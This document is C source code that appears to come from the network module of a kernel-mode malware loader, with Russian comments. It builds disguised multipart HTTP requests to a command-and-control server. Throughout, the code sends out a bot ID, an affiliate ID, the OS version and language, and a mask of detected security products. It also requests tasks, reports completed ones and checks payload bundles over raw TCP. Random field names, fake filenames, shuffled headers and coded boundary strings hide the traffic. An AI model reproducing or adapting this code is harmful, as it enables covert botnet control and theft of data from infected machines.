#define MAX_QUERY_BUFFER_SIZE 4096

int netcomm_parse_uri(const char* uri, char** pHostName, uint16_t* pPort, char** pHostPort, char** pPath, uint32_t* pPathLen)
{
    const char* itr;
    const char* end;
    size_t uriLen = 0;
    uint32_t len1, len2;
    pmod_common_block_t pCommonBlock;
    pmod_netcomm_block_t pNetcommBlock;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;
    pNetcommBlock = pGlobalBlock->pNetcommBlock;

    uriLen = pCommonBlock->fncommon_strlen_s(uri, MAX_QUERY_BUFFER_SIZE);
    if (uriLen < 3) {
        return ERR_VAL;
    }

    itr = uri;
    end = itr + uriLen;

    if (((*(uint32_t*)itr | 0x20202020) == 0x70747468) && ((*(uint32_t*)(itr + 4) & 0x002F2F3A) == 0x002F2F3A)) {
        //if (pGlobalBlock->fnRtlCompareMemory(itr, "http://", 7) == 7 /*|| RtlCompareMemory(itr, "HTTP://", 7) == 7*/) {
        uri += 7;
        itr += 7;
        uriLen -= 7;
    }
    // Подсчитываем количество символов для домена.
    for ( ; itr < end; ++itr) {
        if (*itr == '/' || *itr == ':')
            break;
    }

    len1 = (uint32_t)(itr - uri);

    pCommonBlock->fncommon_allocate_memory(pCommonBlock, pHostName, len1 + 1, NonPagedPool);
    pCommonBlock->fnmemcpy(*pHostName, uri, len1);

    // Подсчитываем длину порта в символах.
    if (*itr == ':') {
        const char* portItr = ++itr;
        char sPort[6];
        for ( ; itr < end; ++itr) {
            if (*itr == '/')
                break;
        }

        len2 = (uint32_t)(itr - portItr);
        if (len2 < 6) {
            pCommonBlock->fnmemcpy(sPort, portItr, len2);
            sPort[len2] = 0;
            *pPort = (uint16_t)pCommonBlock->fncommon_atou64(sPort, 32);
        }
        else {
            pCommonBlock->fnExFreePoolWithTag(pHostName, LOADER_TAG);
            return ERR_VAL;
        }
    }
    else {
        len2 = 0;
        *pPort = 80;
    }

    len1 = len1 + len2 + (len2 > 0 ? 1 : 0);
    if (pHostPort != NULL) {
        pCommonBlock->fncommon_allocate_memory(pCommonBlock, pHostPort, len1 + 1, NonPagedPool);
        pCommonBlock->fnmemcpy(*pHostPort, uri, len1);
    }

    // Подсчитываем количество символов для домена.
    len2 = (uint32_t)uriLen - len1 + LOADER_ID_SIZE + 19;

    // К урлу добавляем /%UNIQUE_ID%
    pCommonBlock->fncommon_allocate_memory(pCommonBlock, pPath, len2, NonPagedPool);
    pCommonBlock->fnmemcpy(*pPath, uri + len1, (uint32_t)uriLen - len1);

    if ((*pPath)[0] == '\0') {
        (*pPath)[0] = '/';
    }

    if (pPathLen != NULL) {
        *pPathLen = len2;
    }

    return ERR_OK;
}

char* netcomm_generate_boundary_separator_for_nrt(netcomm_request_type nrt)
{
    uint32_t lastBitIndex, bitIndex = 0, seed, bsLen = 777;
    int lastNrtApprox, nrtApprox = 0, bitVal;
    char* bs;
    char ch, rnd;
    rsa_context_t rsa;
    USE_GLOBAL_BLOCK

    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &bs, 64, NonPagedPool);

    // Получаем системное время, которое будем использовать в качестве сида для генеработа случаных чисел.
    seed = pGlobalBlock->pCommonBlock->fncommon_get_system_time();

    // Инициализируем генератор случайных чисел.
    pGlobalBlock->pLogicBlock->fnlogic_read_public_key(&rsa, pGlobalBlock->pCommonBlock->pConfig->publicKey);
    pGlobalBlock->pCommonBlock->fncrypto_random_init(&rsa);

    for ( ; --bsLen > 0; ) {
        pGlobalBlock->pCommonBlock->fncrypto_random(&seed);
    }

    do {
        rnd = (char)(pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % 64);

        if (rnd >= 0 && rnd <= 25) {
            ch = rnd + 65;
        }
        else if (rnd >= 27 && rnd <= 52) {
            ch = rnd + 70;
        }
        else if (rnd >= 54 && rnd <= 63) {
            ch = rnd - 6;
        }
        else {
            continue;
        }

        bs[bsLen++] = ch;

        bitVal = (ch >> bitIndex) & 1;
        if (bitVal) {
            --nrtApprox;
        }
        else {
            ++nrtApprox;
        }

        bitIndex = bsLen % 7;

        if (bsLen > 7 && bsLen <= 48) {
            if (nrtApprox == nrt) {
                break;
            }
            if (bsLen == 8) {
                lastNrtApprox = nrtApprox;
                lastBitIndex = bitIndex;
            }
        }
        else if (bsLen > 48) {
            bsLen = 8;
            nrtApprox = lastNrtApprox;
            bitIndex = lastBitIndex;
        }
    } while (1);

    bs[bsLen] = '\0';

    pGlobalBlock->pCommonBlock->fnrsa_free(&rsa);

    return bs;
}

void netcomm_generate_random_name(uint32_t* pSeed, char* name, uint32_t nameMaxSize)
{
    uint32_t i;
    uint32_t nameLen;
    USE_GLOBAL_BLOCK

    nameLen = 7 + (pGlobalBlock->pCommonBlock->fncrypto_random(pSeed) % (nameMaxSize - 7));
    for (i = 0; i < nameLen; ++i) {
        char ch = (char)(pGlobalBlock->pCommonBlock->fncrypto_random(pSeed) % 52) + 65;
        if (ch > 90) {
            ch += 6;
        }
        name[i] = ch;
    }

    name[i] = '\0';
}

char* netcomm_prepare_request(netcomm_request_type nrt, const char* host, const char* url, uint32_t* pHttpRequestLen)
{
#define RANDOM_DATA_PREFIX 128
#define MIN_HEADER_FIELDS 4
    char* inParams;
    char* ptr;
    char* tmpBuffer;
    char *data, *completePart;
    uint32_t tmp = 0, inSize = 0, outSize;
    uint32_t i, seed, partsNum, maxRegion, dataPos = 0;
    rsa_context_t rsa;
    uint32_t partsLen[MIN_HEADER_FIELDS];
    char* bs;
    char* httpBody;
    char* httpRequest;
    uint32_t bundleNameSize;
    USE_GLOBAL_BLOCK

    // HTTP body: --x7x7x7\r\ncontent-disposition: form-data; name="t%02x"\r\n\r\n%s\r\n--x7x7x7--

    if (nrt == NRT_SYSTEM_INFO) {
        inSize = 1 // Версия лоадера
            + sizeof(pGlobalBlock->pCommonBlock->zerokitHeader.affid)
            + sizeof(pGlobalBlock->pCommonBlock->zerokitHeader.subid)
            + sizeof(pGlobalBlock->osVer)
            + sizeof(pGlobalBlock->osLang)
            + sizeof(pGlobalBlock->hipsMask);
    }
    else if (nrt == NRT_TASKS_REQUEST) {
    }
    else if (nrt == NRT_TASKS_REPORT) {
        pGlobalBlock->pTasksBlock->fntasks_fill_with_completed(0, &inSize);
    }
    else if (nrt == NRT_BUNDLE_CHECK) {
        bundleNameSize = pGlobalBlock->pCommonBlock->fnstrlen(pGlobalBlock->pCommonBlock->currBundleName) + 1;
        inSize = 20 + bundleNameSize; // name + sha1
    }
    else {
        return NULL;
    }

    inSize += RANDOM_DATA_PREFIX + sizeof(pGlobalBlock->pCommonBlock->pConfig->sid) + LOADER_ID_SIZE;

    outSize = (inSize * 4) / 3 + 16;

    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &inParams, inSize, NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &httpRequest, 4096, NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &httpBody, 4096, NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &completePart, 4096, NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &data, outSize, NonPagedPool);
    pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &tmpBuffer, 4096, NonPagedPool);

    ptr = inParams;

    // Получаем системное время, которое будем использовать в качестве сида для генеработа случаных чисел.
    seed = pGlobalBlock->pCommonBlock->fncommon_get_system_time();

    // Инициализируем генератор случайных чисел.
    pGlobalBlock->pLogicBlock->fnlogic_read_public_key(&rsa, pGlobalBlock->pCommonBlock->pConfig->publicKey);
    pGlobalBlock->pCommonBlock->fncrypto_random_init(&rsa);


    for (i = 0; i < 70; ++i) {
        pGlobalBlock->pCommonBlock->fncrypto_random(&seed);
    }

    // Рандомные данные в самом начале.
    for (i = 0; i < RANDOM_DATA_PREFIX; ++i) {
        *(ptr++) = (uint8_t)pGlobalBlock->pCommonBlock->fncrypto_random(&seed);
    }

    // Идентификатор клиента.
    __movsb(ptr, (uint8_t*)&pGlobalBlock->pCommonBlock->pConfig->sid, sizeof(pGlobalBlock->pCommonBlock->pConfig->sid));
    ptr += sizeof(pGlobalBlock->pCommonBlock->pConfig->sid);
    // Уникальный идентификатор бота.
    __movsb(ptr, pGlobalBlock->pCommonBlock->pConfig->botId, LOADER_ID_SIZE);
    ptr += LOADER_ID_SIZE;

    if (nrt == NRT_SYSTEM_INFO) {
        // Версия лоадера
        *(uint8_t*)ptr = (_MAJOR_VERSION << 4) | _MINOR_VERSION;
        ptr += 1;

        // ID пользователя
        pGlobalBlock->pCommonBlock->fnmemcpy(ptr, &pGlobalBlock->pCommonBlock->zerokitHeader.affid, sizeof(pGlobalBlock->pCommonBlock->zerokitHeader.affid));
        ptr += sizeof(pGlobalBlock->pCommonBlock->zerokitHeader.affid);

        // СубИдентификатор клиента
        pGlobalBlock->pCommonBlock->fnmemcpy(ptr, &pGlobalBlock->pCommonBlock->zerokitHeader.subid, sizeof(pGlobalBlock->pCommonBlock->zerokitHeader.subid));
        ptr += sizeof(pGlobalBlock->pCommonBlock->zerokitHeader.subid);

        // Версия системы
        pGlobalBlock->pCommonBlock->fnmemcpy(ptr, &pGlobalBlock->osVer, sizeof(pGlobalBlock->osVer));
        ptr += sizeof(pGlobalBlock->osVer);

        // Язык системы
        pGlobalBlock->pCommonBlock->fnmemcpy(ptr, &pGlobalBlock->osLang, sizeof(pGlobalBlock->osLang));
        ptr += sizeof(pGlobalBlock->osLang);

        // Маска HIPS-ов
        pGlobalBlock->pCommonBlock->fnmemcpy(ptr, &pGlobalBlock->hipsMask, sizeof(pGlobalBlock->hipsMask));
        ptr += sizeof(pGlobalBlock->hipsMask);
    }
    else if (nrt == NRT_TASKS_REQUEST) {
    }
    else if (nrt == NRT_TASKS_REPORT) {
        pGlobalBlock->pTasksBlock->fntasks_fill_with_completed(&ptr, &tmp);
    }
    else if (nrt == NRT_BUNDLE_CHECK) {
        __movsb((uint8_t*)ptr, pGlobalBlock->pCommonBlock->currBundleSha1, 20);
        __movsb(ptr + 20, pGlobalBlock->pCommonBlock->currBundleName, bundleNameSize);
        ptr += 20 + bundleNameSize;
    }

    bs = pGlobalBlock->pNetcommBlock->fnnetcomm_generate_boundary_separator_for_nrt(nrt);

    // Количество полей для Multipart form-data.
    partsNum = 1 + pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % 4;

    // Максимальное количество символов на блок с вычетом необходимых пустот между блоками.
    if (partsNum > 1) {
        maxRegion = 0;
        for (i = 1; i < partsNum; ++i) {
            uint32_t val;
            do {
                val = pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % (inSize - maxRegion);
            } while (val < 11 || val > (inSize / partsNum));

            partsLen[i] = val; 
            maxRegion += val;
        }
        partsLen[0] = inSize - maxRegion;
    }

    ptr = httpBody;

    for (i = 0; i < partsNum; ++i) {
        char* blockTypeFields;
        uint32_t k = 0;
        char randName[16], randFileName[33];
        uint32_t fieldType = pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % 2;
        uint32_t blockSize = ((partsNum == 1) ? inSize : partsLen[i]);

        pGlobalBlock->pNetcommBlock->fnnetcomm_generate_random_name(&seed, randName, sizeof(randName));

        if (fieldType == 0) { // простой текстовый блок.
            blockTypeFields = (char*)&k;

base64DataFormat:
            __stosb(data, 0, outSize);
            pGlobalBlock->pCommonBlock->fnbase64_encode(data, inParams + dataPos, blockSize);
            dataPos += blockSize;

            pGlobalBlock->pCommonBlock->fncommon_printfA(completePart, 4096, pGlobalBlock->pNetcommBlock->contentDispBlock,
                bs, randName, blockTypeFields, data);

            pGlobalBlock->pCommonBlock->fncommon_strcat_s(ptr, 4096 - (ptr - httpBody), completePart);
            ptr += pGlobalBlock->pCommonBlock->fnstrlen(completePart);
        }
        else if (fieldType == 1) { // блок с файлом.
            pGlobalBlock->pNetcommBlock->fnnetcomm_generate_random_name(&seed, randFileName, sizeof(randFileName) - 4);

            k = 0x007A372E;
            pGlobalBlock->pCommonBlock->fncommon_strcat_s(randFileName, sizeof(randFileName), (char*)&k);

            k = pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % 2;

            pGlobalBlock->pCommonBlock->fncommon_printfA(tmpBuffer, 4096, pGlobalBlock->pNetcommBlock->blockTypeFields,
                randFileName, k ? pGlobalBlock->pNetcommBlock->encTypes + 7 : pGlobalBlock->pNetcommBlock->encTypes);
            if (k) { // base64
                blockTypeFields = tmpBuffer;
                goto base64DataFormat;
            }
            else { // binary
                pGlobalBlock->pCommonBlock->fncommon_printfA(completePart, 4096, pGlobalBlock->pNetcommBlock->contentDispBlock,
                    bs, randName, tmpBuffer, (char*)&k);
                pGlobalBlock->pCommonBlock->fncommon_strcat_s(ptr, 4096 - (ptr - httpBody), completePart);
                ptr += pGlobalBlock->pCommonBlock->fnstrlen(completePart) - 2;

                __movsb(ptr, inParams + dataPos, blockSize);
                dataPos += blockSize;
                ptr += blockSize;
                *((uint16_t*)ptr) = 0x0A0D; ptr += 2;
            }
        }
    }

    // Добавляем тело и терминатор для Multipart form-data
    dataPos = 0x2d2d;
    pGlobalBlock->pCommonBlock->fncommon_strcat_s(ptr, 4096 - (ptr - httpBody), (char*)&dataPos); ptr += 2;
    pGlobalBlock->pCommonBlock->fncommon_strcat_s(ptr, 4096 - (ptr - httpBody), bs); ptr += pGlobalBlock->pCommonBlock->fnstrlen(bs);
    pGlobalBlock->pCommonBlock->fncommon_strcat_s(ptr, 4096 - (ptr - httpBody), (char*)&dataPos); ptr += 2;

    // Генерируем HTTP-заголовок.
    pGlobalBlock->pCommonBlock->fncommon_printfA(httpRequest, 4096, pGlobalBlock->pNetcommBlock->postQuery, url);

    __stosb((uint8_t*)partsLen, 0, sizeof(partsLen));

    partsNum = dataPos = 0;
    for ( ; partsNum < MIN_HEADER_FIELDS; ) {
        maxRegion = pGlobalBlock->pCommonBlock->fncrypto_random(&seed) % MIN_HEADER_FIELDS;

        if (partsLen[maxRegion] == 0) {
            ++partsNum;
            partsLen[maxRegion] = 1;

            if (maxRegion == 0) { // hdrHost
                pGlobalBlock->pCommonBlock->fncommon_printfA(completePart, 4096, pGlobalBlock->pNetcommBlock->hdrHost, host);
            }
            else if (maxRegion == 1) { // hdrContentType
                pGlobalBlock->pCommonBlock->fncommon_printfA(completePart, 4096, pGlobalBlock->pNetcommBlock->hdrContentType, bs);
            }
            else if (maxRegion == 2) { // hdrContentLength
                pGlobalBlock->pCommonBlock->fncommon_printfA(completePart, 4096, pGlobalBlock->pNetcommBlock->hdrContentLength, 
                    (int)(ptr - httpBody));
            }
            else if (maxRegion == 3) { // hdrUserAgent
                pGlobalBlock->pCommonBlock->fncommon_printfA(completePart, 4096, pGlobalBlock->pNetcommBlock->hdrUserAgent, 
                    pGlobalBlock->osMajorVersion, pGlobalBlock->osMinorVersion, 
#ifdef _WIN64
                    pGlobalBlock->pNetcommBlock->hdrUserAgentx64
#else
                    (char*)&dataPos
#endif // _WIN64
                    );
            }
            pGlobalBlock->pCommonBlock->fncommon_strcat_s(httpRequest, 4096, completePart);
        }
    }

    // Добавляем опциональных полей.


    // Добавляем пустую строку после заголовка
    dataPos = 0x0A0D;
    pGlobalBlock->pCommonBlock->fncommon_strcat_s(httpRequest, 4096, (char*)&dataPos);

    *pHttpRequestLen = pGlobalBlock->pCommonBlock->fnstrlen(httpRequest);

    // Добавляем тело к заголовку.
    __movsb(httpRequest + pGlobalBlock->pCommonBlock->fnstrlen(httpRequest), httpBody, ptr - httpBody);

    *pHttpRequestLen += (uint32_t)(ptr - httpBody);

    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(bs, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(inParams, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(data, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(completePart, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(tmpBuffer, LOADER_TAG);
    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(httpBody, LOADER_TAG);

    pGlobalBlock->pCommonBlock->fnrsa_free(&rsa);

    return httpRequest;
}


bool_t netcomm_parse_http_header(const char** pItr, const char* end, uint16_t* pHttpCode, uint32_t* pContentLen)
{
    char sHttpCode[4];
    const char* itr = *pItr;
    const char* hdrEnd = end;
    const char* contLen;
    bool_t contentLenFound = FALSE;
    bool_t ret = FALSE;
    pmod_common_block_t pCommonBlock;
    USE_GLOBAL_BLOCK

    pCommonBlock = pGlobalBlock->pCommonBlock;

    while (itr < end && *itr != ' ') {
        itr++;
    }

    if (itr + 7 < end) {
        sHttpCode[0] = *(++itr);
        sHttpCode[1] = *(++itr);
        sHttpCode[2] = *(++itr);
        sHttpCode[3] = 0;
        *pHttpCode = (uint16_t)pCommonBlock->fncommon_atou64(sHttpCode, 32);

        if ((*pHttpCode & 0xC8) == 0xC8) { // код ошибки 2xx
            itr += 2;

            // Ищем конец заголовка
            while (itr < end) {
                if ((itr + 3 < hdrEnd) && *itr == '\r') {
                    if (*(itr + 1) == '\n' && *(itr + 2) == '\r' && *(itr + 3) == '\n') {
                        hdrEnd = itr + 4;
                        break;
                    }
                }
                itr++;
            }

            itr = *pItr;

            while (itr < hdrEnd) {
                if ((itr + 8 < hdrEnd) && *itr == 'C') {
                    if (*(itr + 1) == 'o' && *(itr + 2) == 'n' && *(itr + 3) == 't' && *(itr + 4) == 'e' && *(itr + 5) == 'n' && *(itr + 6) == 't' && *(itr + 7) == '-') {
                        itr += 8;
                        if ((itr + 7 < hdrEnd) && *itr == 'L') {
                            if (*(itr + 1) == 'e' && *(itr + 2) == 'n' && *(itr + 3) == 'g' && *(itr + 4) == 't' && *(itr + 5) == 'h' && *(itr + 6) == ':') {
                                itr += 7;
                                contentLenFound = TRUE;
                                break;
                            }
                        }
                    }
                }
                itr++;
            }

            if (itr < hdrEnd && contentLenFound) {
                while (itr < hdrEnd && *itr == ' ') {
                    itr++;
                }

                contLen = itr;
                while (itr < hdrEnd && *itr != '\r') {
                    itr++;
                }

                itr += 2;
                *pContentLen = (uint32_t)pCommonBlock->fncommon_atou64(contLen, 32);
            }
            else {
                *pContentLen = 0; // Отсутствует поле СontentLength
            }

            *pItr = (char*)hdrEnd;
            ret = TRUE;
        }
    }

    return ret;
}

int netcomm_valide_response(const char* httpResponse, uint32_t httpResponseLen, const char** pHttpBody, uint32_t* pHttpBodyLen)
{
    int err = ERR_BAD_SERVER_RESPONSE;
    const char* itr = httpResponse;
    const char* end = httpResponse + httpResponseLen;
    uint16_t code = 0;
    uint32_t contentLength = 0;
    USE_GLOBAL_BLOCK

    // Парсим полученные данные от сервера.
    if (pGlobalBlock->pNetcommBlock->fnnetcomm_parse_http_header(&itr, end, &code, &contentLength)) {
        if (contentLength == 0 || (contentLength + 1 > (httpResponseLen + 1 - (uint32_t)(itr - httpResponse))))
            err = ERR_VAL;
        else {
            if (contentLength == (uint32_t)-1) {
                *pHttpBodyLen = 0;
            }
            else {
                *pHttpBodyLen = contentLength;
            }
            *pHttpBody = itr;
            err = ERR_OK;
        }
    }
    else {
        *pHttpBodyLen = 0;
    }

    return err;
}

int netcomm_make_server_transaction(uint32_t serverAddr, uint16_t port, const char* httpRequest, uint32_t httpRequestLen, uint8_t** pHttpBody, uint32_t* pHttpBodySize, uint8_t** pHttpResponse)
{
    int err = ERR_MEM;
    ip_addr_t srvAddr;
    uint8_t* httpResponse = NULL;
    uint32_t totalSize = 0;
    USE_GLOBAL_BLOCK

    do {
        pGlobalBlock->pCommonBlock->serverAddr = srvAddr.addr = serverAddr;

        pGlobalBlock->pNetcommBlock->pConnection = netconn_new(NETCONN_TCP);
        if (pGlobalBlock->pNetcommBlock->pConnection == NULL) {
            break;
        }

        // Коннектимся к серверу
        if (pGlobalBlock->pTcpipBlock->fnnetconn_connect(pGlobalBlock->pNetcommBlock->pConnection, &srvAddr, port) != ERR_OK) {
            err = ERR_CONN;
            break;
        }

        err = netconn_write(pGlobalBlock->pNetcommBlock->pConnection, httpRequest, httpRequestLen, NETCONN_COPY);

        if (err == ERR_OK) {
            struct netbuf* pNetbuf;

            while ((err = pGlobalBlock->pTcpipBlock->fnnetconn_recv(pGlobalBlock->pNetcommBlock->pConnection, &pNetbuf)) == ERR_OK) {
                PUCHAR newBiggerBuff = NULL;

                pGlobalBlock->pCommonBlock->fncommon_allocate_memory(pGlobalBlock->pCommonBlock, &newBiggerBuff, totalSize + netbuf_len(pNetbuf), NonPagedPool);
                if (totalSize > 0) {
                    pGlobalBlock->pCommonBlock->fnmemcpy(newBiggerBuff, httpResponse, totalSize);
                    pGlobalBlock->pCommonBlock->fnExFreePoolWithTag(httpResponse, LOADER_TAG);
                }

                httpResponse = newBiggerBuff;

                netbuf_copy(pNetbuf, httpResponse + totalSize, netbuf_len(pNetbuf));
                totalSize += netbuf_len(pNetbuf);
                pGlobalBlock->pTcpipBlock->fnnetbuf_delete(pNetbuf);
            }

//             {
//                 uint32_t val = 1;
//                 char filename[] = {'\\', '?', '?' ,'\\', 'C', ':', '\\', '0', '5', '.', 'x', '\0'};
//                 pGlobalBlock->pCommonBlock->fncommon_save_file(filename, httpResponse, totalSize);
//             }

            if (totalSize > 0) {
                *pHttpResponse = httpResponse;
                err = pGlobalBlock->pNetcommBlock->fnnetcomm_valide_response(httpResponse, totalSize, pHttpBody, pHttpBodySize);
            }
         }

        //pGlobalBlock->pTcpipBlock->fnnetconn_close_shutdown(pGlobalBlock->pNetcommBlock->pConnection, NETCONN_SHUT_RDWR);
    } while (0);

    pGlobalBlock->pTcpipBlock->fnnetconn_delete(pGlobalBlock->pNetcommBlock->pConnection);

    return err;
}
